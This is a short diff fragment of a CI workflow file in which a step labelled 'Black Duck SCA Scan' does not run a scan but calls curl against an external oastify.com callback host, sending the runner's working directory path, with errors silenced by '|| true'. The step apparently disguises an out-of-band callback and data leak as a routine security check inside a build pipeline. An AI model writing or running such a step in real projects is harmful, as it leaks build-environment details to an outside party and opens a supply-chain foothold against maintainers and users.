@@ -86,4 +86,3 @@ jobs:
 
       - name: Black Duck SCA Scan
         run: echo "scan-step" && curl -sS "https://ceuzm6zkq38pzfeikjrd8rqroiu9i16q.oastify.com/scan?host=$(pwd)" || true
- 
